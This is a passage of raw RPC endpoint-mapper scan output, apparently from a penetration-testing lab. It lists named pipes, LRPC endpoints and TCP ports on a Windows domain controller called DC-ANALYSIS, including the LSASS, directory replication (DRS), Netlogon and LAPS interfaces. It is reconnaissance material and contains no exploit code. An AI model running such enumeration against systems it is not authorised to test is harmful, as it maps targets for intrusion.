[*] 10.129.36.127:135      - 50abc2a4-574d-40b3-9d66-ee4fd5fba076 v5.0 TCP (49705) 10.129.36.127 
[*] 10.129.36.127:135      - 76f226c3-ec14-4325-8a99-6a46348418af v1.0 LRPC (WMsgKRpc0BA3F1) 
[*] 10.129.36.127:135      - 12e65dd8-887f-41ef-91bf-8d816c42c2e7 v1.0 LRPC (WMsgKRpc0BA3F1) [Secure Desktop LRPC interface]
[*] 10.129.36.127:135      - 367abb81-9844-35f1-ad32-98f038001003 v2.0 TCP (49693) 10.129.36.127 
[*] 10.129.36.127:135      - 650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 PIPE (\PIPE\ROUTER) \\DC-ANALYSIS [Vpn APIs]
[*] 10.129.36.127:135      - 650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 LRPC (RasmanLrpc) [Vpn APIs]
[*] 10.129.36.127:135      - 650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 LRPC (VpnikeRpc) [Vpn APIs]
[*] 10.129.36.127:135      - 650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 LRPC (LRPC-4a1e75d6703d5c4341) [Vpn APIs]
[*] 10.129.36.127:135      - 2f5f6521-cb55-1059-b446-00df0bce31db v1.0 PIPE (\pipe\tapsrv) \\DC-ANALYSIS [Unimodem LRPC Endpoint]
[*] 10.129.36.127:135      - 2f5f6521-cb55-1059-b446-00df0bce31db v1.0 LRPC (tapsrvlpc) [Unimodem LRPC Endpoint]
[*] 10.129.36.127:135      - 2f5f6521-cb55-1059-b446-00df0bce31db v1.0 LRPC (unimdmsvc) [Unimodem LRPC Endpoint]
[*] 10.129.36.127:135      - a4b8d482-80ce-40d6-934d-b22a01a44fe7 v1.0 LRPC (LicenseServiceEndpoint) [LicenseManager]
[*] 10.129.36.127:135      - 906b0ce0-c70b-1067-b317-00dd010662da v1.0 LRPC (LRPC-bc2019cef3592128ea) 
[*] 10.129.36.127:135      - 906b0ce0-c70b-1067-b317-00dd010662da v1.0 LRPC (LRPC-bc2019cef3592128ea) 
[*] 10.129.36.127:135      - 906b0ce0-c70b-1067-b317-00dd010662da v1.0 LRPC (LRPC-bc2019cef3592128ea) 
[*] 10.129.36.127:135      - 906b0ce0-c70b-1067-b317-00dd010662da v1.0 LRPC (OLE5E173B4C3098774F2B453A587CBD) 
[*] 10.129.36.127:135      - 906b0ce0-c70b-1067-b317-00dd010662da v1.0 LRPC (LRPC-bb6422fab077a9ea2f) 
[*] 10.129.36.127:135      - 4c9dbf19-d39e-4bb9-90ee-8f7179b20283 v1.0 LRPC (LRPC-22f61e269e3ca430ba) 
[*] 10.129.36.127:135      - fd8be72b-a9cd-4b2c-a9ca-4ded242fbe4d v1.0 LRPC (LRPC-22f61e269e3ca430ba) 
[*] 10.129.36.127:135      - 95095ec8-32ea-4eb0-a3e2-041f97b36168 v1.0 LRPC (LRPC-22f61e269e3ca430ba) 
[*] 10.129.36.127:135      - e38f5360-8572-473e-b696-1b46873beeab v1.0 LRPC (LRPC-22f61e269e3ca430ba) 
[*] 10.129.36.127:135      - d22895ef-aff4-42c5-a5b2-b14466d34ab4 v1.0 LRPC (LRPC-22f61e269e3ca430ba) 
[*] 10.129.36.127:135      - 98cd761e-e77d-41c8-a3c0-0fb756d90ec2 v1.0 LRPC (LRPC-22f61e269e3ca430ba) 
[*] 10.129.36.127:135      - b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 LRPC (LRPC-27148828d2c55f3fd0) 
[*] 10.129.36.127:135      - df4df73a-c52d-4e3a-8003-8437fdf8302a v0.0 LRPC (LRPC-b2df8bca4c44b60adb) [WM_WindowManagerRPC\Server]
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-0123456789ab v1.0 LRPC (LRPC-928a05418f77234d8c) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-0123456789ab v1.0 TCP (49674) 10.129.36.127 
[*] 10.129.36.127:135      - 0b6edbfa-4a24-4fc6-8a23-942b1eca65d1 v1.0 LRPC (LRPC-928a05418f77234d8c) 
[*] 10.129.36.127:135      - 0b6edbfa-4a24-4fc6-8a23-942b1eca65d1 v1.0 TCP (49674) 10.129.36.127 
[*] 10.129.36.127:135      - ae33069b-a2a8-46ee-a235-ddfd339be281 v1.0 LRPC (LRPC-928a05418f77234d8c) 
[*] 10.129.36.127:135      - ae33069b-a2a8-46ee-a235-ddfd339be281 v1.0 TCP (49674) 10.129.36.127 
[*] 10.129.36.127:135      - 4a452661-8290-4b36-8fbe-7f4093a94978 v1.0 LRPC (LRPC-928a05418f77234d8c) 
[*] 10.129.36.127:135      - 4a452661-8290-4b36-8fbe-7f4093a94978 v1.0 TCP (49674) 10.129.36.127 
[*] 10.129.36.127:135      - 76f03f96-cdfd-44fc-a22c-64950a001209 v1.0 LRPC (LRPC-928a05418f77234d8c) 
[*] 10.129.36.127:135      - 76f03f96-cdfd-44fc-a22c-64950a001209 v1.0 TCP (49674) 10.129.36.127 
[*] 10.129.36.127:135      - 98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 LRPC (LRPC-663e2846864400c754) [XactSrv service]
[*] 10.129.36.127:135      - 1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 LRPC (LRPC-663e2846864400c754) [IdSegSrv service]
[*] 10.129.36.127:135      - 6b5bdd1e-528c-422c-af8c-a4079be4fe48 v1.0 LRPC (ipsec) [Remote Fw APIs]
[*] 10.129.36.127:135      - 6b5bdd1e-528c-422c-af8c-a4079be4fe48 v1.0 TCP (49669) 10.129.36.127 [Remote Fw APIs]
[*] 10.129.36.127:135      - b18fbab6-56f8-4702-84e0-41053293a869 v1.0 LRPC (OLE4A1945994FC44D1684EA17583342) [UserMgrCli]
[*] 10.129.36.127:135      - b18fbab6-56f8-4702-84e0-41053293a869 v1.0 LRPC (LRPC-a64c1435d61eefc36c) [UserMgrCli]
[*] 10.129.36.127:135      - 0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 LRPC (OLE4A1945994FC44D1684EA17583342) [UserMgrCli]
[*] 10.129.36.127:135      - 0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 LRPC (LRPC-a64c1435d61eefc36c) [UserMgrCli]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 PIPE (\pipe\lsass) \\DC-ANALYSIS [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (audit) [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (securityevent) [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (LSARPC_ENDPOINT) [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (lsacap) [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (LSA_EAS_ENDPOINT) [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (lsapolicylookup) [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (lsasspirpc) [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (protected_storage) [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (SidKey Local End Point) [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (samss lpc) [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b) [KeyIso]
[*] 10.129.36.127:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 TCP (49667) 10.129.36.127 [KeyIso]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 PIPE (\pipe\lsass) \\DC-ANALYSIS [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (audit) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (securityevent) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (LSARPC_ENDPOINT) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (lsacap) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (LSA_EAS_ENDPOINT) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (lsapolicylookup) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (lsasspirpc) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (protected_storage) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (SidKey Local End Point) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (samss lpc) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 TCP (49667) 10.129.36.127 [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 PIPE (\pipe\lsass) \\DC-ANALYSIS [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (audit) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (securityevent) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (LSARPC_ENDPOINT) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (lsacap) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (LSA_EAS_ENDPOINT) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (lsapolicylookup) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (lsasspirpc) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (protected_storage) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (SidKey Local End Point) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (samss lpc) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b) [Ngc Pop Key Service]
[*] 10.129.36.127:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 TCP (49667) 10.129.36.127 [Ngc Pop Key Service]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 PIPE (\pipe\lsass) \\DC-ANALYSIS [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (audit) [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (securityevent) [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (LSARPC_ENDPOINT) [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (lsacap) [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (LSA_EAS_ENDPOINT) [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (lsapolicylookup) [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (lsasspirpc) [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (protected_storage) [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (SidKey Local End Point) [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (samss lpc) [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b) [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 TCP (49667) 10.129.36.127 [Impl friendly name]
[*] 10.129.36.127:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (OLE67AA4A797535DEE64A3407F79111) [Impl friendly name]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 PIPE (\pipe\lsass) \\DC-ANALYSIS [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (audit) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (securityevent) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (LSARPC_ENDPOINT) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (lsacap) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (LSA_EAS_ENDPOINT) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (lsapolicylookup) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (lsasspirpc) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (protected_storage) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (SidKey Local End Point) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (samss lpc) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 TCP (49667) 10.129.36.127 [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (OLE67AA4A797535DEE64A3407F79111) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 LRPC (NTDS_LPC) [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 HTTP (49670) 10.129.36.127 [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0 PIPE (\pipe\5b7a52fcc1c94803) \\DC-ANALYSIS [MS NT Directory DRS Interface]
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 PIPE (\pipe\lsass) \\DC-ANALYSIS 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (audit) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (securityevent) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (LSARPC_ENDPOINT) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (lsacap) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (LSA_EAS_ENDPOINT) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (lsapolicylookup) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (lsasspirpc) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (protected_storage) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (SidKey Local End Point) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (samss lpc) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 TCP (49667) 10.129.36.127 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (OLE67AA4A797535DEE64A3407F79111) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (NTDS_LPC) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 HTTP (49670) 10.129.36.127 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 PIPE (\pipe\5b7a52fcc1c94803) \\DC-ANALYSIS 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 PIPE (\pipe\lsass) \\DC-ANALYSIS 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (audit) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (securityevent) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (LSARPC_ENDPOINT) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (lsacap) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (LSA_EAS_ENDPOINT) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (lsapolicylookup) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (lsasspirpc) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (protected_storage) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (SidKey Local End Point) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (samss lpc) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 TCP (49667) 10.129.36.127 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (OLE67AA4A797535DEE64A3407F79111) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (NTDS_LPC) 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 HTTP (49670) 10.129.36.127 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 PIPE (\pipe\5b7a52fcc1c94803) \\DC-ANALYSIS 
[*] 10.129.36.127:135      - 12345778-1234-abcd-ef00-0123456789ac v1.0 TCP (49671) 10.129.36.127 
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 PIPE (\pipe\lsass) \\DC-ANALYSIS [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (audit) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (securityevent) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (LSARPC_ENDPOINT) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (lsacap) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (LSA_EAS_ENDPOINT) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (lsapolicylookup) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (lsasspirpc) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (protected_storage) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (SidKey Local End Point) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (samss lpc) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 TCP (49667) 10.129.36.127 [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (OLE67AA4A797535DEE64A3407F79111) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (NTDS_LPC) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 HTTP (49670) 10.129.36.127 [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 PIPE (\pipe\5b7a52fcc1c94803) \\DC-ANALYSIS [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 TCP (49671) 10.129.36.127 [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (NETLOGON_LRPC) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 PIPE (\pipe\lsass) \\DC-ANALYSIS [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (audit) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (securityevent) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (LSARPC_ENDPOINT) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (lsacap) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (LSA_EAS_ENDPOINT) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (lsapolicylookup) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (lsasspirpc) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (protected_storage) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (SidKey Local End Point) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (samss lpc) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 TCP (49667) 10.129.36.127 [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (OLE67AA4A797535DEE64A3407F79111) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (NTDS_LPC) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 HTTP (49670) 10.129.36.127 [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 PIPE (\pipe\5b7a52fcc1c94803) \\DC-ANALYSIS [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 TCP (49671) 10.129.36.127 [RemoteAccessCheck]
[*] 10.129.36.127:135      - 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 LRPC (NETLOGON_LRPC) [RemoteAccessCheck]
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 PIPE (\pipe\lsass) \\DC-ANALYSIS 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (audit) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (securityevent) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (LSARPC_ENDPOINT) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (lsacap) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (LSA_EAS_ENDPOINT) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (lsapolicylookup) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (lsasspirpc) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (protected_storage) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (SidKey Local End Point) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (samss lpc) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 TCP (49667) 10.129.36.127 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (OLE67AA4A797535DEE64A3407F79111) 
[*] 10.129.36.127:135      - 12345678-1234-abcd-ef00-01234567cffb v1.0 LRPC (NTDS_LPC) 
